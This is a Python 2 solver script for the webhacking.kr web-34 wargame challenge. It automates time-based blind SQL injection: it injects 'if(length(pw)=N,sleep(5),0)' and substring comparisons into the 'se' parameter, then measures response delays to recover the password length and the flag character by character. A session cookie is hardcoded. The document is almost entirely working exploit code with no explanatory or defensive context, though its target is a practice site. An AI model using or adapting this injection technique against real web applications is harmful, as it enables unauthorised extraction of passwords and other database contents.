#-*- coding: utf-8 -*-
import sys
import time
import urllib2

import CookieManager


challengeUrl = "https://webhacking.kr/challenge/web-34/"

print "[+] Find password length"
flagLength = 0
isFoundPassword = False

CookieManager.addCookie("PHPSESSID", "9gka3g0g4soj3plpg8phk7p56f")

for flagLength in range(1, 30):
    parameters  = "?msg=1024"
    parameters += "&se=if(length(pw)=%d,sleep(5),0)" % flagLength
    httpRequest = urllib2.Request(challengeUrl+parameters)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        elapsedTime = time.time()
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        
        print "[*] Blind SQL Injection...", flagLength
        elapsedTime = time.time() - elapsedTime
        
        if elapsedTime > 5:
            print "[!] FIND IT! flag length is [", flagLength, "]"
            isFoundPassword = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundPassword:
    sys.exit(-1)

flag = ""
for caretIndex in range(1, flagLength+1):
    print
    print "[+] Find flag...", caretIndex, "", 
    for charIndex in range(0x20, 0x7f):
        if chr(charIndex) == '%' or chr(charIndex) == '_':
            continue
        sys.stdout.write(".")
        parameters  = "?msg=1024"
        parameters += "&se=if(substr(pw,%d,1)=%s,sleep(5),0)" % (caretIndex, hex(charIndex))
        httpRequest = urllib2.Request(challengeUrl+parameters)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            elapsedTime = time.time()
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            elapsedTime = time.time() - elapsedTime
            
            if elapsedTime > 5:
                print "\n[!] flag[" + str(caretIndex) + "] is [", chr(charIndex), "]"
                flag += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[!] flag is [", flag, "]"
